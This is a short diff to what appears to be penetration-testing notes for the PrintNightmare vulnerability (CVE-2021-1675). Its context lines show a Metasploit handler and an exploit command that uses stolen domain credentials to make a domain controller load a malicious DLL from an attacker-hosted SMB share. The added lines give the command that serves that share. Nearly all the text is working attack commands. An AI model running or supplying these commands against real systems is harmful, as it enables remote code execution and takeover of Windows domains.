@@ -48,4 +48,8 @@ msf6 exploit(multi/handler) > run
 ``` shell
 sudo python3 CVE-2021-1675.py Domain/User:Password@<DC-IP> '\\<Attacker-IP>\CompData\backupscript.dll'
 ```
+Example
+``` shell
+sudo smbserver.py -smb2support CompData /home/Desktop/shared
+```
 
